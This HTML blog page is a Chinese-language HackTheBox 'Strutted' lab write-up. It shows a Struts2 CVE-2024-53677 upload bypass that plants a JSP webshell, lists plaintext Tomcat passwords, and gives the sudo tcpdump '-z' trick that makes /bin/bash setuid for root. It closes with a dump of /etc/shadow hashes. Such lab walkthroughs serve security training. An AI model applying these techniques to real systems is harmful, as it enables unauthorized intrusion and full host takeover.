@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>HackTheBox——HTB Strutted Writeup | Hexo | </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="theme-color" content="#3F51B5">
+  
+  
+  <meta name="keywords" content="writeup">
+  <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习在退役吧唧中的免费吧唧 nmap1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox——HTB Strutted Writeup">
+<meta property="og:url" content="http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习在退役吧唧中的免费吧唧 nmap1234567891">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250225082458.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250225100025.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250225102033.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250225102141.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250225164559.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250225165235.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250225165408.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250304172924.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250305082913.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250305083014.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250305083931.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250305084326.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020250305084926.png">
+<meta property="article:published_time" content="2025-06-19T13:59:05.063Z">
+<meta property="article:modified_time" content="2025-06-19T13:59:05.067Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020250225082458.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  <meta name="summary" content="">
+  <link rel="shortcut icon" href="/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="loading" class="active"></div>
+
+  <nav id="menu" class="hide" >
+   <div class="inner flex-row-vertical">
+  <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+      <i class="icon icon-lg icon-close"></i>
+  </a>
+  <div class="brand-wrap">
+    <div class="brand">
+      <a href="/" class="avatar"><img src="/img/logo.jpg"></a>
+      <hgroup class="introduce">
+        <h5 class="nickname">John Doe</h5>
+        <a href="mailto:634206017@qq.com" title="634206017@qq.com" class="mail">634206017@qq.com</a>
+      </hgroup>
+    </div>
+  </div>
+  <div class="scroll-wrap flex-col">
+    <ul class="nav">
+      
+          <li class="waves-block waves-effect">
+            <a href="/"  >
+              <i class="icon icon-lg icon-home"></i>
+              主页
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="/archives"  >
+              <i class="icon icon-lg icon-archives"></i>
+              Archives
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="/tags"  >
+              <i class="icon icon-lg icon-tags"></i>
+              Tags
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="https://github.com/yscoder" target="_blank" >
+              <i class="icon icon-lg icon-github"></i>
+              Github
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="http://www.weibo.com/ysweb" target="_blank" >
+              <i class="icon icon-lg icon-weibo"></i>
+              Weibo
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="/404"  >
+              <i class="icon icon-lg icon-link"></i>
+              测试
+            </a>
+          </li>
+      
+    </ul>
+
+    <footer class="footer">
+  <p><a rel="license" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0;vertical-align:middle;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPCAMAAABEF7i9AAAAllBMVEUAAAD///+rsapERER3d3eIiIjMzMzu7u4iIiKUmZO6v7rKzsoODg4RERFVVVUNDQ0NDg0PEA8zMzNLTEtbXltmZmZydnF9gn2AgICPkI+ZmZmqqqq7u7vFxsXIzMgNDQwZGRkgICAhISEkJSMnKCcuMC4xMzE5Ozk7PTtBQkFCQkJDQ0Nna2eGhoaHh4ezuLLGysbd3d1wVGpAAAAA4UlEQVR42q2T1xqCMAyFk7QsBQeKA9x7j/d/OSm22CpX0nzcpA1/T05aAOuBVkMAScQFHLnEwoCo2f1TnQIGoVMewjZEjVFN4GH1Ue1Cn2jWqwfsOOj6wDwGvotsl/c8lv7KIq1eLOsT0HMFHMIE/RZyHnlphryT9zyV+8WH5e8yQw3wnQvgAFxPTKUVi555SHR/lOfLMgVTeDlSfN+TaoUsiTyeIm+bCkHvCA2FUKG48LDtYBZBknsYP/G8NTw0gaaHyuQf4H5pecrB/FYCT2sL9zAfy1Xyjou6L8X2W7YcLyBZCRtnq/zfAAAAAElFTkSuQmCC" /></a></p>
+  <p>Hexo &copy; 2025</p>
+  <p>Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme
+  <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a></p>
+  <a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-2x icon-rss-square"></i></a>
+</footer>
+
+  </div>
+</div>
+
+  </nav>
+  <main id="main">
+    <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">HackTheBox——HTB Strutted Writeup</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input " autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-share">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header">
+  <div class="container">
+    <h1 class="author">HackTheBox——HTB Strutted Writeup</h1>
+    <h5 class="subtitle">
+        
+            <time datetime="2025-06-19T13:59:05.063Z" itemprop="datePublished" class="page-time">
+  2025-06-19
+</time>
+
+
+        
+    </h5>
+  </div>
+</header>
+
+    <div class="container body-wrap">
+      <article id="post-HackTheBox——HTB Strutted Writeup/HackTheBox——HTB Strutted Writeup" 
+  class="article article-type-post" itemprop="blogPost">
+    <div class="post-meta flex-row">
+        
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </div>
+    <div class="post-body">
+        <aside class="post-widget" id="post-widget">
+
+            
+            <div class="post-share" id="post-share">
+    <div class="tit">分享到：</div>
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
+          豆
+        </a>
+      </li>
+    </ul>
+ </div>
+
+            
+
+            
+            <nav class="post-toc-wrap" id="post-toc">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#nmap"><span class="post-toc-number">1.</span> <span class="post-toc-text">nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#source-code"><span class="post-toc-number">2.</span> <span class="post-toc-text">source code</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Find-struts2-exploit"><span class="post-toc-number">3.</span> <span class="post-toc-text">Find struts2 exploit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#CVE-2024-53677"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">CVE-2024-53677</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#analysis-upload-packets"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">analysis upload packets</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#adjust-upload-packets"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">adjust upload packets</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-As-Tomcat"><span class="post-toc-number">4.</span> <span class="post-toc-text">Shell As Tomcat</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-As-James"><span class="post-toc-number">5.</span> <span class="post-toc-text">Shell As James</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#GTFObins-find-tcpdump-exploit"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">GTFObins find tcpdump exploit</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Hashes"><span class="post-toc-number">6.</span> <span class="post-toc-text">Hashes</span></a></li></ol>
+            </nav>
+            
+        </aside>
+
+        <div class="post-main">
+
+            <div class="post-content" id="post-content" itemprop="postContent">
+            <p>Welcome to N0nome&#96;s F**king <a target="_blank" rel="noopener" href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
+<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/Pasted%20image%2020250225082458.png"><br><code>在退役吧唧中的免费吧唧</code></p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://strutted.htb/</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先把域名加到hosts里面</p>
+<p>看一眼web界面<br><img src="/images/Pasted%20image%2020250225100025.png"></p>
+<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>上来就是让上传文件<br>先看看别的，上下都有小字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Upload Your Images, Get a Shareable Link</span><br><span class="line">Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.</span><br><span class="line">Supported file types: JPG, JPEG, PNG, GIF</span><br><span class="line">上传您的图像，获取可共享链接</span><br><span class="line">立即上传图像并接收独特的可共享链接。确保您的图像随时随地安全、可访问且易于共享。</span><br><span class="line">支持的文件类型：JPG、JPEG、PNG、GIF</span><br><span class="line"></span><br><span class="line">Interested in our setup?</span><br><span class="line">We provide a Docker image that showcases the Strutted™ environment. Click the Download link on the menu to explore our Docker image to see how our platform is configured, and use it as a base template for your own projects.</span><br><span class="line">对我们的设置感兴趣吗？</span><br><span class="line">我们提供了一个展示 Strutted™ 环境的 Docker 映像。单击菜单上的“下载”链接来探索我们的 Docker 映像，了解我们的平台是如何配置的，并将其用作您自己的项目的基本模板。</span><br></pre></td></tr></table></figure>
+<p>提示说给了一个docker映像，在右上角download可以下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[10:03:10] athena:Strutted $ ls</span><br><span class="line">context.xml  Dockerfile  nmap.txt  README.md  strutted  strutted.zip  tomcat-users.xml</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>东西有点多，都看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[10:07:04] athena:Strutted $ cat tomcat-users.xml </span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;tomcat-users&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">    &lt;user username=&quot;admin&quot; password=&quot;skqKY6360z!Y&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>有一个密码了，但是没啥用，</p>
+<h3 id="Find-struts2-exploit"><a href="#Find-struts2-exploit" class="headerlink" title="Find struts2 exploit"></a>Find struts2 exploit</h3><h4 id="CVE-2024-53677"><a href="#CVE-2024-53677" class="headerlink" title="CVE-2024-53677"></a>CVE-2024-53677</h4><p>翻源码可以看到版本<br><img src="/images/Pasted%20image%2020250225102033.png"><br>Google一下<br>（其实源码还可以翻到点别的，比如说CVE<img src="/images/Pasted%20image%2020250225102141.png">）<br>Google翻到了<a target="_blank" rel="noopener" href="https://github.com/EQSTLab/CVE-2024-53677">CVE-2024-53677</a>的poc，git下来尝试一下（在Google上找一个jsp的webshell）<br><img src="/images/Pasted%20image%2020250225164559.png"></p>
+<h4 id="analysis-upload-packets"><a href="#analysis-upload-packets" class="headerlink" title="analysis upload packets"></a>analysis upload packets</h4><p>返回了200，但是response里面还是home页面的信息，burp抓包看一下吧<br>直接上传jsp会提示<code>Supported file types: JPG, JPEG, PNG, GIF!</code><br><img src="/images/Pasted%20image%2020250225165235.png"><br>尝试绕过一下，改一下后缀<br>又提示不是图像<br><img src="/images/Pasted%20image%2020250225165408.png"><br>那只能加魔术字了</p>
+<p>找一个jpg或者png文件传上去，burp抓去发送到repeater，将魔术字下面的内容替换成我们的jspshell内容</p>
+<p>昨天看了一篇<a target="_blank" rel="noopener" href="https://potato.gold/data/uploads/pdf/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E7%B1%BB%E4%B9%A6%E7%B1%8D/%E8%85%BE%E8%AE%AFWAF%E6%8C%91%E6%88%98%E8%B5%9B%E5%9B%9E%E5%BF%86%E5%BD%95.pdf">文章</a>，是关于绕过的，但是也看到了一个熟悉的身影——multipart&#x2F;form-data; boundary&#x3D;的</p>
+<p><img src="/images/Pasted%20image%2020250304172924.png"><br>上传成功，但是没有办法解析成jsp<br>回看一下上面CVE的详解去<br>可能<a target="_blank" rel="noopener" href="https://github.com/TAM-K592/CVE-2024-53677-S2-067/blob/ALOK/Check-CVE-2024-53677.py">原始的poc</a>是这个？上面用的那个是人家自己改的，都运用top.UploadFileName去尝试覆盖文件名<br><code>坏习惯，有poc不先看好人家的利用原理和具体过程</code></p>
+<h4 id="adjust-upload-packets"><a href="#adjust-upload-packets" class="headerlink" title="adjust upload packets"></a>adjust upload packets</h4><p>这样的话双写一下boundary&#x3D;尝试一下覆盖<br><img src="/images/Pasted%20image%2020250305082913.png"><br>在res里面可以看到有上传成功，访问一下<br><img src="/images/Pasted%20image%2020250305083014.png"><br>ok，可以进入shell了<br><img src="/images/Pasted%20image%2020250305083931.png"></p>
+<h3 id="Shell-As-Tomcat"><a href="#Shell-As-Tomcat" class="headerlink" title="Shell As Tomcat"></a>Shell As Tomcat</h3><p>看下用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tomcat@strutted:~$ <span class="built_in">cat</span> /etc/passwd | grep sh</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep sh</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">james:x:1000:1000:Network Administrator:/home/james:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>看样子下一步是james了<br>当前用户是tomcat，找一下配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">tomcat@strutted:/etc/tomcat9$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 220</span><br><span class="line">drwxr-xr-x   4 root root     4096 Jan 15 14:30 .</span><br><span class="line">drwxr-xr-x 107 root root     4096 Jan 21 13:54 ..</span><br><span class="line">drwxrwxr-x   3 root tomcat   4096 Jan 15 14:30 Catalina</span><br><span class="line">-rw-r-----   1 root tomcat   7276 Jan 15  2022 catalina.properties</span><br><span class="line">-rw-r-----   1 root tomcat   1400 Jan 15  2022 context.xml</span><br><span class="line">-rw-r-----   1 root tomcat   1149 Jan 15  2022 jaspic-providers.xml</span><br><span class="line">-rw-r-----   1 root tomcat   2799 Jul 19  2022 logging.properties</span><br><span class="line">drwxr-xr-x   2 root tomcat   4096 Jan 15 14:30 policy.d</span><br><span class="line">-rw-r-----   1 root tomcat   7606 Jan  7 10:40 server.xml</span><br><span class="line">-rw-r-----   1 root tomcat   2902 Jan 11 13:49 tomcat-users.xml</span><br><span class="line">-rw-r-----   1 root tomcat 172359 Jan 15  2022 web.xml</span><br><span class="line">tomcat@strutted:/etc/tomcat9$ grep <span class="string">&#x27;password&#x27;</span> -ri .</span><br><span class="line">grep <span class="string">&#x27;password&#x27;</span> -ri .</span><br><span class="line">./tomcat-users.xml:  you must define such a user - the username and password are arbitrary.</span><br><span class="line">./tomcat-users.xml:  will also need to <span class="built_in">set</span> the passwords to something appropriate.</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;robot&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;IT14d6SSP81k&quot;</span> roles=<span class="string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  them. You will also need to <span class="built_in">set</span> the passwords to something appropriate.</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">./tomcat-users.xml:  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">./server.xml:      &lt;!-- Use the LockOutRealm to prevent attempts to guess user passwords</span><br></pre></td></tr></table></figure>
+<p>找到一个密码<code>IT14d6SSP81k</code>,试一下james<br><img src="/images/Pasted%20image%2020250305084326.png"></p>
+<h3 id="Shell-As-James"><a href="#Shell-As-James" class="headerlink" title="Shell As James"></a>Shell As James</h3><h4 id="GTFObins-find-tcpdump-exploit"><a href="#GTFObins-find-tcpdump-exploit" class="headerlink" title="GTFObins find tcpdump exploit"></a>GTFObins find tcpdump exploit</h4><p>因为有密码可以先看下sudo -l</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">james@strutted:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> james on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User james may run the following commands on localhost:</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure>
+<p>翻阅<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#tcp">GTFObins</a>发现有利用<br><img src="/images/Pasted%20image%2020250305084926.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">james@strutted:~$ COMMAND=<span class="string">&#x27;chmod 4777 /bin/bash&#x27;</span></span><br><span class="line">TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span> &gt; <span class="variable">$TF</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line"><span class="built_in">sudo</span> tcpdump -<span class="built_in">ln</span> -i lo -w /dev/null -W 1 -G 1 -z <span class="variable">$TF</span> -Z root</span><br><span class="line">tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">Maximum file <span class="built_in">limit</span> reached: 1</span><br><span class="line">1 packet captured</span><br><span class="line">4 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">james@strutted:~$ bash -p</span><br><span class="line">bash-5.1# </span><br></pre></td></tr></table></figure>
+<p>get root</p>
+<h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$4kM4HKyBvH.VNLjh.Zd60/$27BeC7cFIgPH.bVrllpoxXQwtc4tMCN6EZkI9Tqbw/B:20100:0:99999:7:::</span><br><span class="line">daemon:*:19405:0:99999:7:::</span><br><span class="line">bin:*:19405:0:99999:7:::</span><br><span class="line">sys:*:19405:0:99999:7:::</span><br><span class="line">sync:*:19405:0:99999:7:::</span><br><span class="line">games:*:19405:0:99999:7:::</span><br><span class="line">man:*:19405:0:99999:7:::</span><br><span class="line">lp:*:19405:0:99999:7:::</span><br><span class="line">mail:*:19405:0:99999:7:::</span><br><span class="line">news:*:19405:0:99999:7:::</span><br><span class="line">uucp:*:19405:0:99999:7:::</span><br><span class="line">proxy:*:19405:0:99999:7:::</span><br><span class="line">www-data:*:19405:0:99999:7:::</span><br><span class="line">backup:*:19405:0:99999:7:::</span><br><span class="line">list:*:19405:0:99999:7:::</span><br><span class="line">irc:*:19405:0:99999:7:::</span><br><span class="line">gnats:*:19405:0:99999:7:::</span><br><span class="line">nobody:*:19405:0:99999:7:::</span><br><span class="line">_apt:*:19405:0:99999:7:::</span><br><span class="line">systemd-network:*:19405:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19405:0:99999:7:::</span><br><span class="line">messagebus:*:19405:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19405:0:99999:7:::</span><br><span class="line">pollinate:*:19405:0:99999:7:::</span><br><span class="line">sshd:*:19405:0:99999:7:::</span><br><span class="line">syslog:*:19405:0:99999:7:::</span><br><span class="line">uuidd:*:19405:0:99999:7:::</span><br><span class="line">tcpdump:*:19405:0:99999:7:::</span><br><span class="line">tss:*:19405:0:99999:7:::</span><br><span class="line">landscape:*:19405:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19405:0:99999:7:::</span><br><span class="line">usbmux:*:19474:0:99999:7:::</span><br><span class="line">lxd:!:19474::::::</span><br><span class="line">tomcat:!*:20095::::::</span><br><span class="line">james:$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8.59:20100:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+
+            
+            <div class="post-reward">
+                <a id="rewardBtn" href="javascript:;" class="post-reward-btn waves-effect waves-circle waves-light">赏</a>
+            </div>
+            
+            
+            <blockquote>
+                <p>
+                本文地址：
+                <a href="http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/" target="_blank" rel="external">http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Strutted%20Writeup/</a>
+                </p>
+                <footer><cite><a href="http://example.com">@Hexo</a></cite></footer>
+            </blockquote>
+            </div>
+            
+<nav class="post-nav">
+  
+    <div class="waves-block waves-effect prev fl">
+      <a href="/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
